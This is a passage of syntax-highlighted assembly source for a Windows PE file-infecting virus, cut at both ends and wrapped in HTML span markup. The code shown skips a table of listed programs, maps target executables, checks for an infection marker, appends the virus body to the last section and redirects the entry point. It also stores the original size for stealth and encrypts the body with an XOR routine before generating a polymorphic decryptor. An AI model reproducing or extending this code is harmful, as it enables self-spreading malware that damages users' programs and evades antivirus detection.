    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">@@BadProgramz</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; Ptr to table</span><span class="sc0">
</span><span class="sc5">ASF_Loop</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Clear EAX</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">                                   </span><span class="sc1">; Load size of string in AL</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0BBh</span><span class="sc0">                         </span><span class="sc1">; End of table?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">AllShitFilesProcessed</span><span class="sc0">           </span><span class="sc1">; Oh, shit!</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Put Size in ECX</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Preserve program pointer</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">cmpsb</span><span class="sc0">                           </span><span class="sc1">; Compare both strings</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">                             </span><span class="sc1">; Restore program pointer</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">ShitFileFound</span><span class="sc0">                   </span><span class="sc1">; Damn, a shitty file!</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; Pointer to another string</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ASF_Loop</span><span class="sc0">                        </span><span class="sc1">; in table &amp; loop</span><span class="sc0">
</span><span class="sc5">AllShitFilesProcessed</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">; Overlap, so CL = 0F9h</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">ShitFileFound</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">                                     </span><span class="sc1">; Set carry</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; PE Infection (with parameters)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        EDI = Pointer to file name</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">_Infection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetFileAttributesA</span><span class="sc0">
    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ExitInfection</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_dwFileAttributes</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">
    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">_ExitInfection</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">00000000h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetFileSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc5">duhast</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">engel</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">duhast</span><span class="sc0">
</span><span class="sc5">engel</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Infection</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ModBase</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">]</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">                          </span><span class="sc1">; Overlapppppp</span><span class="sc0">
    </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">_ExitInfection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">; PE Infection (with WIN32_FIND_DATA)</span><span class="sc0">
</span><span class="sc1">; ===========================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; input:</span><span class="sc0">
</span><span class="sc1">;        Nothing (everything needed is in WFD structure).</span><span class="sc0">
</span><span class="sc1">; output:</span><span class="sc0">
</span><span class="sc1">;        Nothing.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">Infection</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_szFileName</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; Get FileName to infect</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">80h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_SetFileAttributesA</span><span class="sc0">             </span><span class="sc1">; Wipe its attributes</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">OpenFile</span><span class="sc0">                        </span><span class="sc1">; Open it</span><span class="sc0">

    </span><span class="sc5">cmp_</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CantOpen</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FileHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; 1st we create map with</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateMap</span><span class="sc0">                       </span><span class="sc1">; its exact size</span><span class="sc0">
    </span><span class="sc5">cmpz_</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapFile</span><span class="sc0">                         </span><span class="sc1">; Map it</span><span class="sc0">
    </span><span class="sc5">cmpz_</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">UnMapFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; Get PE Header</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc3">"EP"</span><span class="sc0">            </span><span class="sc1">; Is it PE?</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">NoInfect</span><span class="sc0">

    </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc5">mark</span><span class="sc4">],</span><span class="sc5">ddInfMark</span><span class="sc0">  </span><span class="sc1">; Was it infected?</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoInfect</span><span class="sc0">
       
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_UnmapViewOfFile</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_CloseHandle</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; And Map all again.</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CreateMap</span><span class="sc0">
    </span><span class="sc5">cmpz_</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">CloseFile</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapHandle</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MapFile</span><span class="sc0">
    </span><span class="sc5">cmpz_</span><span class="sc0">   </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">UnMapFile</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GetLastSection</span><span class="sc0">                  </span><span class="sc1">; ESI = Last Section</span><span class="sc0">
                        </span><span class="sc1">; EDI = PE header</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Save original EIP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">OldEIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">14h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EDX = Phisical address where</span><span class="sc0">
                        </span><span class="sc1">; append virus</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; EAX = VA of new EIP</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Set the new entrypoint</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NewEIP</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Retrieve new SizeOfRawData</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">virus_size</span><span class="sc0">                  </span><span class="sc1">; and VirtualSize</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc9">Align</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Set new SizeOfRawData</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">08h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; Set new VirtualSize</span><span class="sc0">

    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">; Set new SizeOfImage</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A0h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; Nulify the relocs, so they</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">0A4h</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">        </span><span class="sc1">; won't fuck us :)</span><span class="sc0">

    </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">24h</span><span class="sc4">],</span><span class="sc5">section_flags</span><span class="sc0"> </span><span class="sc1">; Set new section attributes</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">mark</span><span class="sc4">],</span><span class="sc5">ddInfMark</span><span class="sc0">  </span><span class="sc1">; Mark infected files</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">WFD_nFileSizeLow</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">orig_size</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; Store orig. size for stealth</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">infections</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc1">; Some RDA stuff</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                     </span><span class="sc1">; Save ESI and EDI for later</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">crypto</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc5">encrypt_size</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                           </span><span class="sc1">; Obtain virus CRC32</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">CRC</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">         </span><span class="sc1">; Store it</span><span class="sc0">

    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetTickCount</span><span class="sc0">                   </span><span class="sc1">; Get a random number as seed</span><span class="sc0">
    </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                         </span><span class="sc1">; for RDA encryption</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc1">; Append virus &amp; RDA encryption</span><span class="sc0">
    
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">MapAddress</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Write non crypted part</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">virus_start</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">non_crypt_size</span><span class="sc0">
    </span><span class="sc6">cld</span><span class="sc0">
    </span><span class="sc6">rep</span><span class="sc0">     </span><span class="sc6">movsb</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">encrypt_size</span><span class="sc0">                </span><span class="sc1">; Encrypt and copy the rest</span><span class="sc0">
</span><span class="sc5">cryptl</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">bl</span><span class="sc0">
    </span><span class="sc6">stosb</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">cryptl</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">; Poly decryptor generation</span><span class="sc0">

    </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">random_seed</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; Get a slow seed for poly</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc5">apicall</span><span class="sc0"> </span><span class="sc5">_GetSystemTime</span><span class="sc0">

    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">poly_virus_size</span><span class="sc0">             </span><span class="sc1">; Obtain exactly a reliable</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">                           </span><span class="sc1">; value of virus_size divided</span><span class="sc0">
